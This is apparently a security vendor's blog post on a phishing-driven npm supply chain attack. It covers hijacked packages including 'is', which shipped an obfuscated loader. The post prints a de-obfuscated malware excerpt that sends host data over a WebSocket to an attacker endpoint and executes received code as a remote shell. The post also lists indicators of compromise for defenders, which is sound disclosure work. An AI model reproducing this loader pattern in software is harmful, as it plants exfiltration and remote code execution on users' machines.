---
title: "npm 'is' Package Hijacked in Expanding Supply Chain Attack"
date: 2025-07-22 12:00:00 +0000
categories: [Supply Chain]
tags: [Phishing, Infostealer, npm, Scavenger, Developer Compromise, Obfuscation, T1195.002]
author: kirill_and_sarah
canonical_url: https://socket.dev/blog/npm-is-package-hijacked-in-expanding-supply-chain-attack
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/cd105b9ae939bbfd9bdacb9c5591c95dba403c21-1024x1024.png
  alt: "npm 'is' Package Hijacked in Expanding Supply Chain Attack"
description: "The ongoing npm phishing campaign escalates as attackers hijack the popular 'is' package, embedding malware in multiple versions."
---

In the wake of the [npm phishing campaign](https://socket.dev/blog/npm-phishing-email-targets-developers-with-typosquatted-domain) we reported on last Friday, which began with a typosquatted domain (`npnjs[.]com`) targeting developers, the situation has continued to escalate. Notably, This Week in React curator Sébastien Lorber pointed out that spoofed emails from `npmjs.org` slipped through [due to missing DMARC and SPF records on the .org domain](https://twitter.com/sebastienlorber/status/1947309941234041339?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1947312942518514024%7Ctwgr%5Ed6f44efaad9d02bc3e40e655b906ba36c85a948c%7Ctwcon%5Es2_&ref_url=https%3A%2F%2Fwww.notion.so%2Fsocketdev%2FMalware-Analysis-and-Reverse-Engineering-Report-2374cb3adfeb800093abd1ed6d78e7d5).

Shortly after our initial warning, we alerted developers about popular [compromised packages](https://socket.dev/blog/npm-phishing-campaign-leads-to-prettier-tooling-packages-compromise) like `eslint-config-prettier` and `eslint-plugin-prettier`, which were published using stolen maintainer credentials.

With access to the maintainers' npm tokens, the threat actor published rogue versions of seven packages: `eslint-config-prettier` (8.10.1, 9.1.1, 10.1.6, 10.1.7), `eslint-plugin-prettier` (4.2.2, 4.2.3), `synckit@0.11.9`, `@pkgr/core@0.2.8`, `napi-postinstall@0.3.1`, `got-fetch` (5.1.11, 5.1.12), and `is` (3.3.1, 5.0.0). These malicious updates were automatically distributed to developers and CI systems through normal dependency resolution workflows.

Over the weekend, the team behind [Humpty's RE Blog](https://c-b.io/2025-07-20+-+Install+Linters%2C+Get+Malware+-+DevSecOps+Speedrun+Edition) dropped a deep dive into the malware hidden in `eslint-config-prettier`. This is honest reverse engineering work and a solid technical report they managed to publish on Sunday. It covers the malicious `eslint-config-prettier` release and its associated malware, dubbed Scavenger, and details how the compromised package shipped a Windows-specific DLL (`node-gyp.dll`) that loads a sophisticated infostealer using anti-analysis techniques, indirect syscalls, and encrypted C2 communications. The post also confirms the malware's focus on browser data (e.g., Chrome extensions and cached session data) and provides extensive indicators of compromise (IOCs) for defenders.

In addition to their technical breakdown of the malware, we're now sharing the compromised packages tied to this same campaign that have surfaced since our last update.

## Malware Loader in Popular `is` Package

The threat actor that planted a Windows‑only DLL in `eslint‑config‑prettier`, `eslint‑plugin‑prettier`, `synckit@0.11.9`, `@pkgr/core`, `napi‑postinstall`, and `got-fetch` also embedded a JavaScript malware loader in the [`is`](https://socket.dev/npm/package/is/overview/5.0.0) package during the same attack window. This popular package receives ~2.8M weekly downloads and provides a set of utility functions for type checking and validation.

The malicious `is` package is fully cross-platform, executing under Node 12+ on macOS, Linux, and Windows. In contrast, Scavenger DLL runs only on Windows, suggesting the campaign is deploying multiple payload families to maximize reach. The `is` variant drops no DLL; instead, it remains entirely in JavaScript, and maintains a live command and control (C2) channel.

![Socket AI Scanner identifies a heavily obfuscated JavaScript loader embedded in the is package version 5.0.0](https://cdn.sanity.io/images/cgdhsj6q/production/08f06df393d9daabdf9d3e600eb14d1c918eb42d-1553x705.png)
_Socket AI Scanner identifies a heavily‑obfuscated JavaScript loader embedded in the is package version 5.0.0._

The loader reconstructs its hidden payload entirely in memory using a custom decoder built around a 94-character alphabet. It immediately executes the decoded script via `new Function`, leaving no readable artifacts on disk. Once active, it queries Node's `os` module to collect the hostname, operating system, and CPU details, and captures all environment variables from `process.env`. It then dynamically imports the `ws` library to exfiltrate this data over a WebSocket connection. Every message received over the socket is treated as executable JavaScript, giving the threat actor an instant, interactive remote shell.

The following code [excerpts](https://socket.dev/npm/package/is/files/5.0.0/index.js), de-obfuscated and annotated with our comments, demonstrate the malicious logic embedded in the package.

```javascript
// Expose Node's `require`, even in restricted contexts (e.g., Electron)
get "switch"() { return require; }

// Load system and networking modules dynamically
const os = this["switch"]("os");
const WS = this["switch"]("ws");

// Connect to threat actor-controlled WebSocket endpoint
const sock = new WS("wss://<decoded-at-runtime-endpoint>");

// Send host fingerprinting data on connect
sock.onopen = () => sock.send(JSON.stringify({
  host: os.hostname(),
  plat: os.platform(),
  cwd : process.cwd()
}));

// Execute threat actor-supplied code received over the socket
sock.onmessage = ({ data }) => {
  new Function(data)();  // remote code execution
};
```

The payload executes with the same privileges as the host process, allowing unrestricted file system and network access. In addition to harvesting environment variables, it exfiltrates sensitive development context, such as `.npmrc` files and Git remotes. If the process has write access, the malware persists by overwriting its own `index.js`, meaning removal requires more than deleting `node_modules`; lockfiles must also be reset to fully eradicate the infection. Socket has confirmed both `3.3.1` and `5.0.0` of the `is` package as malicious.

## Maintainer Reports Malware in the `is` Package

Jordan Harband alerted the public that the [`is`](https://www.npmjs.com/package/is) package was compromised due to another maintainer's account being hijacked, likely related to the same phishing campaign.

"The old owner was somehow removed from the npm package, and emailed me to be re-added," Harband [said on Bluesky](https://bsky.app/profile/jordan.har.band/post/3ludlwjseec2w). "Everything seemed normal, so I obliged (irritated the npm would remove an owner without notifying the other owners) and the next morning this [malware] was published."

## Additional Popular Packages Compromised

Socket's automated threat detection also flagged malicious releases of `got-fetch`, a package with 20K+ weekly downloads, after an npm maintainer's account was compromised. Both [version 5.1.12](https://socket.dev/npm/package/got-fetch/overview/5.1.12) and [version 5.1.11](https://socket.dev/npm/package/got-fetch/overview/5.1.11) were identified as containing suspicious behavior.

[**got-fetch v5.1.12**](https://socket.dev/npm/package/got-fetch/overview/5.1.12)

[**got-fetch v5.1.11**](https://socket.dev/npm/package/got-fetch/overview/5.1.11)

![Socket threat detection flagging got-fetch](https://cdn.sanity.io/images/cgdhsj6q/production/7bd188f66c2eaea25653b247b6f81fa15562ed85-1271x756.png)

## Impact of the npm Phishing Attacks

The Scavenger malware is proving to be especially nasty for anyone who got hit. In a Hacker News thread, one developer shared how they discovered the malware disabled Chrome's security flags (causing a warning banner in Chrome) and likely performed other malicious actions. To recover, they had to unplug their machine from the network, replace their SSD entirely, reinstall a fresh copy of Windows, and rotate all SSH keys and passwords.

In some cases, simply rolling back package versions isn't enough if the malware has already exfiltrated credentials or tampered with the system.

![Hacker News discussion from affected users](https://cdn.sanity.io/images/cgdhsj6q/production/3db03a8d2f16c2421961852366d31bbd9ebec1d1-1255x309.png)
_Hacker News [discussion](https://news.ycombinator.com/item?id=44621747) from affected users confirms impact of the `node-gyp.dll` malware. One user reported Chrome security flagging, potential SSH key compromise, and full system reinstallation, which is consistent with the malware's scraping of browser credentials and credential config files like `.npmrc` and `.netrc` observed during our analysis._

This isn't the time to be performing blind updates. Socket protects your code by detecting malicious packages before they're added to your code base. Install the free [Socket GitHub App](https://socket.dev/features/github) or secure your projects using our [Safe npm CLI](https://socket.dev/features/cli) tool. These tools scan every dependency and update in real time to protect you from 70+ indicators of supply chain risk.

## Indicators of Compromise (IOCs)

### Malicious Packages and Versions

- `eslint‑config‑prettier` versions 8.10.1, 9.1.1, 10.1.6, 10.1.7
- `eslint‑plugin‑prettier` versions 4.2.2, 4.2.3
- `synckit` version 0.11.9
- `@pkgr/core` version 0.2.8
- `napi‑postinstall` version 0.3.1
- `got-fetch` versions 5.1.11, 5.1.12
- `is` versions 3.3.1, 5.0.0
